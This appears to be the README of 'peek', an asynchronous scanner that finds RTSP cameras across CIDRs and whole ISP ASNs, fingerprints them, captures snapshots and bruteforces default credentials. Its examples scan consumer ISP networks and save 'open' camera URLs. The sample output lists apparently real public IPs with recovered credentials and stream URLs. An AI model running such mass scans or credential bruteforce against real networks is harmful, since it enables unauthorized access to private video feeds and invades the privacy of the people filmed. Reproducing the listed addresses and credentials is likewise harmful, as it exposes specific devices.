# peek

**Async RTSP camera scanner** — reconnaissance, fingerprinting, ONVIF, snapshots, and credential bruteforce.

Find, identify, and verify RTSP cameras at scale. From a single IP to millions, with CIDR, ranges, and ASN support.

---

## Quick start

```bash
git clone https://github.com/yourusername/peek.git
cd peek

# Scan a file (IPs, CIDRs, or ranges, one per line)
python peek.py ips.txt

# Scan a CIDR block
python peek.py --target 192.168.1.0/24 -w 200

# Scan an entire ASN
python peek.py --asn AS28573 -w 300 --save open.txt

# With snapshots and ONVIF
python peek.py ips.txt -w 100 --snapshots
```

Zero dependencies — Python 3.10+ standard library only. (`ffmpeg` and `whois` are optional, for snapshots and ASN lookup.)

---

## Features

- **Async I/O** — `asyncio` with configurable concurrency (`-w`). Thousands of IPs scanned in seconds.
- **CIDR + range targets** — `192.168.1.0/24`, `10.0.0.1-50`, `10.0.0.1:8554` (custom port). File or CLI.
- **ASN support** — `--asn AS28573` fetches prefixes via whois (LACNIC/RADB/RIPE/ARIN/APNIC).
- **TCP + UDP transport** — SETUP tries TCP interleaved first, falls back to UDP unicast.
- **ONVIF probing** — SOAP `GetDeviceInformation` on ports 80/8899/8082. Gets exact model, manufacturer, firmware.
- **FFmpeg snapshots** — `--snapshots` captures a single JPEG frame from each verified stream.
- **Credential bruteforce** — 25 built-in defaults (admin/admin, etc.) plus custom file. Basic + Digest auth.
- **Fingerprinting** — Identifies Hikvision, Dahua, Axis, Foscam, Ubiquiti, and more from Server headers.
- **SDP parsing** — Extracts video/audio codecs from DESCRIBE responses.
- **Export** — JSON, CSV, save open URLs. Human-readable terminal output with real-time progress.

---

## Usage

```
python peek.py [input] [options]
```

### Input

The positional `input` argument is a file with one target per line:

```
192.168.1.1
10.0.0.0/24
192.168.1.10-192.168.1.50
10.0.0.1:8554
```

All formats support an optional `:port` suffix.

Use `--target` / `-T` to pass targets directly on the command line (repeatable):

```bash
python peek.py --target 10.0.0.0/24 --target 192.168.1.1:8554
```

Use `--asn` to fetch all prefixes for an ASN:

```bash
python peek.py --asn AS28573 -w 200 --no-onvif --save claro.txt
```

### Options

| Flag | Arg | Description | Default |
|------|-----|-------------|---------|
| `--target`, `-T` | STR | IP, CIDR, or range (repeatable) | — |
| `--asn` | STR | ASN to fetch prefixes from (repeatable) | — |
| `-w`, `--workers` | INT | Concurrent connections | `50` |
| `-t`, `--timeout` | FLOAT | Timeout in seconds | `5.0` |
| `-p`, `--path` | STR | Extra RTSP path (repeatable) | — |
| `--paths` | FILE | File with paths (one per line) | — |
| `--creds` | FILE | File with credentials (`user:pass` per line) | — |
| `--no-creds` | — | Disable credential bruteforce | off |
| `--port` | INT | Default RTSP port | `554` |
| `--no-onvif` | — | Disable ONVIF probing | off |
| `--snapshots` | — | Capture JPEG frames via ffmpeg | off |
| `--snapshot-dir` | DIR | Output directory for snapshots | `snapshots/` |
| `--json` | FILE | Export results as JSON | — |
| `--csv` | FILE | Export results as CSV | — |
| `--save` | FILE | Save open RTSP URLs | — |

### Examples

```bash
# Fast scan, no enrich
python peek.py ips.txt -w 200 --no-onvif --no-creds

# Full scan with everything
python peek.py ips.txt -w 100 --snapshots --save open.txt --json results.json

# Single IP quick check
python peek.py --target 10.0.0.1 --no-onvif --no-creds

# Scan ASN, save open URLs
python peek.py --asn AS18881 -w 300 --no-onvif --save vivo_abertas.txt
```

---

## Output

### Terminal

```
╔════════════════════════════════════════════════════════════════════════╗
║                         peek v3 (async)                               ║
╚════════════════════════════════════════════════════════════════════════╝

  Targets:     4094
  Paths:       26
  Credentials: 25
  Workers:     200
  Timeout:     5.0s
  ONVIF:       ON
  Snapshots:   OFF

  Liveness [4094/4094] [████████████████████] 100.0% done (23/4094 alive)
  Probe    [ 598/598 ] [████████████████████] 100.0% done
  Brute    [ 150/150 ] [████████████████████] 100.0% done (3 found)
  Enrich   [   3/3   ] [████████████████████] 100.0% done
  Time: 45.2s

═══ Results ═══

  ST   IP                 MAKE           SUMMARY      STREAM             TRANS  PATH
  ──────────────────────────────────────────────────────────────────────────────
  🔓 179.208.77.195     Hikvision      OPEN(AUTH)   V:H264 A:PCMU      TCP    /Streaming/Channels/101 [admin:]
       ONVIF: Hikvision DS-2CD2142FWD-I FW:V5.5.0
  🔓 187.105.18.6       Generic        OPEN         V:H265 A:PCMU      TCP    /video1

═══ Summary ═══
  Total scanned:       4094
  Open (no auth):      1
  Open (with creds):   1
  Auth required:       15
  Closed/Filtered:     4056
  Errors:              0
  Time:                45.2s
  Rate:                90.6 IPs/s

  ✓ 2 open camera(s) found!
```

### URL output (`--save`)

```
rtsp://admin:@179.208.77.195:554/Streaming/Channels/101  # Hikvision [OPEN_AUTH] [tcp]
rtsp://187.105.18.6:554/video1  # Generic [OPEN] [tcp]
```

### JSON export (`--json`)

```json
[
  {
    "ip": "179.208.77.195",
    "port": 554,
    "make": "Hikvision",
    "status": "OPEN(AUTH)",
    "open": true,
    "url": "rtsp://179.208.77.195:554/Streaming/Channels/101",
    "credential": "admin:",
    "stream": {"video": "H264", "audio": "PCMU"},
    "transport": "tcp",
    "onvif": {
      "manufacturer": "Hikvision",
      "model": "DS-2CD2142FWD-I",
      "firmware": "V5.5.0"
    },
    "paths_tested": [...]
  }
]
```

---

## How it works

### Scan pipeline (4 phases)

1. **Liveness** — async TCP connect on port 554 (or custom). Dead hosts dropped immediately.
2. **Path probing** — DESCRIBE on 26 built-in paths (+ custom). Classifies as OPEN, AUTH, or CLOSED. OPEN results verified via SETUP + PLAY with TCP→UDP fallback.
3. **Bruteforce** — targets returning 401 are tested against default credentials (Basic + Digest).
4. **Enrich** — ONVIF SOAP probe + ffmpeg snapshot for each verified camera.

### Architecture

```
peek.py                     ← launcher
peek/
├── cli.py                  ← argparse + output + export
├── scanner.py              ← async scan pipeline
├── protocol.py             ← RTSP (DESCRIBE/SETUP/PLAY) + auth
├── targets.py              ← IP/CIDR/range/ASN parsing
├── fingerprint.py          ← camera make + SDP codec extraction
├── onvif.py                ← SOAP GetDeviceInformation
├── snapshot.py             ← ffmpeg frame capture
└── models.py               ← dataclasses
```

---

## Requirements

- Python 3.10+
- `ffmpeg` (optional, for `--snapshots`)
- `whois` (optional, for `--asn`)

---

## License

MIT
